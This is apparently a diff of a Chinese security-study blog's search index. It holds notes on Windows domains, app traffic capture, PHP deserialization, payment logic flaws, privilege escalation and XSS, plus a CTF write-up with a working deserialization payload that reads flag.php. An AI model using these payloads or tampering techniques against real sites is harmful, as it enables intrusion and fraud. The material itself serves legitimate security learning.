href="https://baike.baidu.com/item/%E8%AE%BA%E5%9D%9B/158397?fromModule=lemma_inlink">论坛</a>等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
+<p><strong>即在两个防火墙之间，内网之外的区域</strong>，<strong>可以大大增加攻击难度</strong></p>
+<h5 id="2-工作组与域"><a href="#2-工作组与域" class="headerlink" title="2.工作组与域"></a>2.工作组与域</h5><p>​	<strong>工作组（Work Group）</strong>是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
+<p>​	<strong>缺点：</strong>缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制。只适合小规模用户的使用。</p>
+<p>​	如：学校宿舍，家庭网络</p>
+<p>​	<strong>攻击手段</strong>：arp欺骗，dns劫持</p>
+<p>​		<strong>注意：局域网攻击（如arp欺骗）并不适用于域</strong></p>
+<p>​	<strong>域</strong>：用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
+<p>​	<strong>域的功能和特点：</strong></p>
+<ul>
+<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
+<li>便捷的资源访问，能够很容易地定位到域中的资源。 用户依次登录就可以访问整个网络资源，集中地身份验证</li>
+<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
+</ul>
+<p>​	如：大超市，学校机房</p>
+<p>​	<strong>工作组与域的区别：</strong>工作组是对等网络，域是B&#x2F;S架构，集中式管理</p>
+<p><img src="https://img-blog.csdn.net/20181022145259655?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<h5 id="3-域控DC-Domain-Control"><a href="#3-域控DC-Domain-Control" class="headerlink" title="3.域控DC(Domain Control)"></a>3.域控DC(Domain Control)</h5><p>​		在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能应该要有至少两个域控。一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在DC中的。而有一台备份域控制（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。当域中的一台计算机安装了AD后，它就成了域控DC了。</p>
+<p><strong>即一个域中最高管理权限，最高用户，最高管理的一台服务器，一般来说，拿下DC就意味着拿下域</strong></p>
+<h5 id="4-活动目录AD-Active-Directory"><a href="#4-活动目录AD-Active-Directory" class="headerlink" title="4.活动目录AD(Active Directory)"></a>4.活动目录AD(Active Directory)</h5><p>​		活动目录AD是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有AD活动目录的服务器就是域控DC。</p>
+<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
+<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
+<p><strong>类似于策略组件，用于提供各种目录服务</strong></p>
+<h5 id="5-域结构"><a href="#5-域结构" class="headerlink" title="5.域结构"></a>5.域结构</h5><p>​	<strong>单域</strong></p>
+<p>​		在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
+<p>​	<img src="https://img-blog.csdn.net/20181022150802375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:50%;"></p>
+<p>​	<strong>父域与子域</strong></p>
+<p>​		第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。父域与子域之间默认建立起了双向信任关系。</p>
+<p>​	<strong>域树与域林</strong></p>
+<h5 id="6-linux域与windows域"><a href="#6-linux域与windows域" class="headerlink" title="6.linux域与windows域"></a>6.linux域与windows域</h5><p>​		linux上也有相对应的活动目录，但是要装LDAP环境，一般企业很少会用LDAP来管理，因为功能上不及域强大，而且用linux来管理要求技术人员门槛高，故linux更适合做服务器，而windows更适合域，所以一般遇到的域是windows域，当然域中包含linux服务器也是很常见的。</p>
+<h5 id="7-常用内网渗透流程"><a href="#7-常用内网渗透流程" class="headerlink" title="7.常用内网渗透流程"></a>7.常用内网渗透流程</h5><p>​		<strong>信息收集&#x3D;》权限提升&#x3D;》横向渗透&#x3D;》权限维持</strong></p>
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/weixin_44110913/article/details/106760045">https://blog.csdn.net/weixin_44110913/article/details/106760045</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>域</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>app抓不到包解决思路</title>
+    <url>/2023/02/19/app%E6%8A%93%E4%B8%8D%E5%88%B0%E5%8C%85%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h2 id="1-检测到模拟器环境"><a href="#1-检测到模拟器环境" class="headerlink" title="1.检测到模拟器环境"></a>1.检测到模拟器环境</h2><ol>
+<li>将app安装到手机上</li>
+<li>电脑和手机（模拟器）在同一个局域网</li>
+</ol>
+<p>​	3.burp抓手机的包</p>
+<h2 id="2-app代理检测导致burp代理时无法正常访问"><a href="#2-app代理检测导致burp代理时无法正常访问" class="headerlink" title="2.app代理检测导致burp代理时无法正常访问"></a>2.app代理检测导致burp代理时无法正常访问</h2><p>​	使用 Postern-3.1.2.apk 工具，下载地址 <a href="https://github.com/postern-overwal/postern-stuff%EF%BC%8C%E5%B7%A5%E5%85%B7%E4%BD%9C%E7%94%A8%E6%98%AF%E5%B0%86%E4%BB%A3%E7%90%86%E7%BD%AE%E4%B8%BA">https://github.com/postern-overwal/postern-stuff，工具作用是将代理置为</a> vpn 代理绕过检测。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	抓不到包，尝试直接在手机上操作或者挂代理</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>app</tag>
       </tags>
   </entry>
   <entry>
@@ -137,6 +340,228 @@
       <tags>
         <tag>sql</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe漏洞总结</title>
+    <url>/2023/02/11/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020-网鼎杯-青龙组-Web-AreUSerialz</title>
+    <url>/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/</url>
+    <content><![CDATA[<p>知识点：php代码审计，魔术方法，php反序列化，弱类型绕过</p>
+<span id="more"></span>
+
+<p>题目：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//包含flag.php,显然要读取这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//类</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//构造函数，创建对象时触发其中内容，所以我们要构造一个类来触发</span></span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//让op == &quot;2&quot;来触发下面的读取函数</span></span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();<span class="comment">//读取函数</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数,销毁类的时候，也就是在最后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//===弱类型，强制将2转换为1，所以考虑绕过，加空格 op =‘ 2‘</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);<span class="comment">//反序列化，所以要先将对象序列化</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ctfhub靶场实操：</p>
+<p>开启容器：<img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190830042.png" alt="image-20230211190830042"></p>
+<p>给出源代码：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211185816020.png" alt="image-20230211185816020"></p>
+<p>根据前文代码审计编写php脚本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot; &quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot;%202&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;%20&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拼接：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190135812.png" alt="image-20230211190135812"></p>
+<p>查看源码：</p>
+<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190155840.png" alt="image-20230211190155840"></p>
+<p>得到flag</p>
+]]></content>
+      <categories>
+        <category>实验</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>代码审计</tag>
+        <tag>反序列化</tag>
+        <tag>弱类型绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反序列化</title>
+    <url>/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化：</strong>序列化是将变量或对象转换成字符串的过程，用于存储或传递的值的过程中，同时不丢失其类型和结构。</p>
+<p><strong>反序列化：</strong>反序列化是将字符串转换成变量或对象的过程</p>
+<p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210150104844.png" alt="image-20230210150104844"></p>
+<span id="more"></span>
+
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码 执行，SQL 注入，目录遍历等不可控后果。</p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>() <span class="comment">//将一个对象转换成一个字符串` </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>() <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>
+
+<p>触发原因：<code>unserialize()</code> 函数的变量可控，文件中存在可利用的类与类中的魔术方法。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//创建对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性`</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用 isset()或 empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用 unset()时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发`</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无类序列化"><a href="#无类序列化" class="headerlink" title="无类序列化"></a>无类序列化</h3><p>运行代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;yuanjiu&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:7:&quot;yuanjiu&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>有类与无类的区别主要在于有无魔术方法，而魔术方法在特定情况下会被触发</strong></p>
+<h3 id="有类序列化"><a href="#有类序列化" class="headerlink" title="有类序列化"></a>有类序列化</h3><p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210154025361.png" alt="image-20230210154025361"></p>
+<p>代码审计&#x3D;》魔术方法</p>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/network/355848.html">https://www.freebuf.com/articles/network/355848.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/341654.html">https://www.freebuf.com/articles/web/341654.html</a></p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>业务逻辑漏洞</title>
+    <url>/2023/02/10/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>业务逻辑漏洞中，支付漏洞最常见，而支付漏洞一直以来就是是高风险，对企业来说危害很大，对用户来说同样危害也大。</p>
+<span id="more"></span>
+
+<h3 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h3><p><strong>要了解支付漏洞就要先了解商品的购买流程：</strong></p>
+<p>选择商品和数量**&#x3D;&gt;<strong>选择支付及配送方式</strong>&#x3D;&gt;<strong>生成订单编号</strong>&#x3D;&gt;<strong>订单支付选择</strong>&#x3D;&gt;**完成支付</p>
+<h3 id="常见参数："><a href="#常见参数：" class="headerlink" title="常见参数："></a>常见参数：</h3><p><strong>通过篡改参数来利用漏洞</strong></p>
+<p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p>
+<p>购买数量：改成负数，达到金额偏差</p>
+<p>订单号：用B商品的价格买A商品</p>
+<p>支付方式：更改支付接口，使金额支付到其它账户</p>
+<h3 id="常见修改方法："><a href="#常见修改方法：" class="headerlink" title="常见修改方法："></a>常见修改方法：</h3><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>逻辑越权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>水平垂直越权</title>
+    <url>/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
+    <content><![CDATA[<p><img src="/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png" alt="image-20230207151741353"></p>
+<span id="more"></span>
+
+<p><strong>水平越权</strong>：获取同级用户账户信息</p>
+<p><strong>垂直越权</strong>：添加高权限用户</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>获取添加用户的数据包</p>
+<h5 id="如何获取数据包"><a href="#如何获取数据包" class="headerlink" title="如何获取数据包"></a>如何获取数据包</h5><ol>
+<li>普通用户前端有操作页面可以抓取数据包</li>
+<li>通过网站源码本地搭建去模拟抓取</li>
+<li>盲猜</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="前端漏洞造成：界面"><a href="#前端漏洞造成：界面" class="headerlink" title="前端漏洞造成：界面"></a>前端漏洞造成：界面</h5><p>判断用户等级后，代码界面部分进行可选显示 </p>
+<h5 id="后端漏洞造成：数据库"><a href="#后端漏洞造成：数据库" class="headerlink" title="后端漏洞造成：数据库"></a>后端漏洞造成：数据库</h5><p>user 表(管理员和普通用户同表）如：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+<th>usertype</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>admin</td>
+<td>123456</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>xiaodi</td>
+<td>11111</td>
+<td>2</td>
+</tr>
+</tbody></table>
+<p><strong>代码的级别判断</strong>：usertype值</p>
+<p>若访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，可尝试对此值进行修改，这就是测试越权漏洞基本方法。</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>逻辑越权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于xss的相关总结</title>
+    <url>/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站攻击，即Cross Site Script Execution(通常简写为XSS)，是前端的漏洞，产生在浏览器一端的漏洞。它是指攻击者在网页中嵌入客户端脚本，主要利用js编写的恶意代码来执行一些想要的功能，也就是说它能干嘛是受到js的控制，那么js能执行出什么脚本代码就取决于它能干嘛。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</p>
+<span id="more"></span>
+
+<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>是一种非持续型攻击。漏洞本身存在，但是需要攻击者构造出来，然后让对方去触发。它不会对正常的访问造成跨站攻击。这种攻击是一次型攻击，它不会写入到数据库里。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射。</p>
+<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135008161.png" alt="image-20230207135008161"></p>
+<h4 id="出现地方"><a href="#出现地方" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是一种持续型的攻击。将跨站代码植入到网站的数据库中。一旦攻击者第一次成功攻击之后，那么在后续的其他访问者均会受到跨站攻击。这种攻击可能是写到网站的留言板，那么当对方访问留言板就会被触发。它与反射型、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大区别在于反射型与DOM型XSS执行都必须依靠用户手动触发，而存储型XSS却不需要。</p>
+<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135110317.png" alt="image-20230207135110317"></p>
+<h4 id="出现地方-1"><a href="#出现地方-1" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
+<h3 id="xss的作用"><a href="#xss的作用" class="headerlink" title="xss的作用"></a>xss的作用</h3><p>常规用到的是盗取cookie、js做钓鱼攻击、流量指向等。主要是盗取管理员的会话和cookie信息，就是我们常说的管理员凭证，就意味着得到后台权限，可以直接利用。还能配合别的漏洞，比如可以和网页木马结合，扔到那里去跳转到网马地址，网马地址被执行后续就控制一些权限</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p>
+<p>通过js可以重构整个HTML页面，而要重构页面或者页面中的某个对象，js就需要知道HTML文档中所有元素的“位置”。而DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。根据DOM规定，HTML文档中的每个成分都是一个节点。</p>
